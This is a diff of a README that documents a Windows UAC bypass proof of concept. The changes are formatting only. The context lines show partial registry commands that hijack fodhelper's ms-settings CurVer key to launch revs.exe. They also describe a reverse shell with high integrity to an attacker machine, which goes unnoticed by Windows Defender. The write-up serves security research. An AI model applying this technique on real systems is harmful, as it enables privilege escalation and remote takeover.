@@ -46,13 +46,16 @@ In fact, in the following images you can see how the test system has been update
 available.
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/c3136cd3-ae03-4a1f-9195-63facfc40269)
+
 *1. List of Windows Update patches installed on the system*
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/c26f4a81-832a-4923-af3b-b87165e95371)
+
 *2. Windows Update - update to the latest available version released*
 
 Windows Defender is correctly active in all its features
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/1b235a9a-2110-490a-b14b-7dca5bc91487)
+
 *3. Windows Defender features*
 
 ## PoC:
@@ -70,6 +73,7 @@ The target machine will have the IP as shown:
 While the attacking machine running Ubuntu 22.04 will have ip:
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/eea1efa5-73af-4041-8556-2f9f8cb25d1e)
+
 *5. Ubuntu IP (attacker)*
 
 The aim is to modify the fodhelper registers in particular HKCU:\Software\Classes\ms-settings\CurVer
@@ -126,6 +130,7 @@ cmd /c ‘call reg add “HKCU\Software\Classes\.hack\Shell\Open\command” /v �
 ``` 
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/2e424062-0893-4ff0-8286-b29f3a69c557)
+
 *6. Registry key associated to .hack with call to revs.exe*
 
 The second command instead will launch cmd which sets the “.hack” extension as the default value for
@@ -136,6 +141,7 @@ cmd /c ‘call reg add “HKCU\Software\Classes\ms-settings\CurVer” /d “.hac
 ```
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/3f2871ee-82e6-4137-a9d6-63debce635c1)
+
 *7. CurVer registry key referenced to .hack registry key*
 
 At this point everything is ready to call fodhelper and receive the connection from the target Windows on
@@ -150,24 +156,29 @@ contact the python server offering the script.ps1 which, once executed, will est
 attacking machine creating a reverse shell with integrity level “high ”
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/1fc84235-1d46-4013-96ea-2d9332034613)
+
 *8. Execute commands writing values to the system registry and calling revs.exe*
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/63bb6a96-bc59-4c04-a8d6-fea8d550b07e)
+
 *9.Target Windows GET request to the attacking server*
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/2b3bcfec-ab43-4a22-aeeb-81880beb86fb)
+
 *10. Reverse shell integrity level obtained by the attacking machine*
 
 We can also notify how Windows Defender did not get alarmed during operations and let us reach the goal
 without its interference
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/b0d9c77d-32a8-4b17-9ff8-db21e1abdfc7)
+
 *11. No threats detected by Windows Defender*
 
 In this last image demonstrating the elevation of privileges, the integrity level (medium) of the powershell
 on which we executed the commands is shown
 
 ![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/e9f28102-c7d4-4400-834f-42d7a0a3035b)
+
 *12. Original powershell integrity level*
 
 
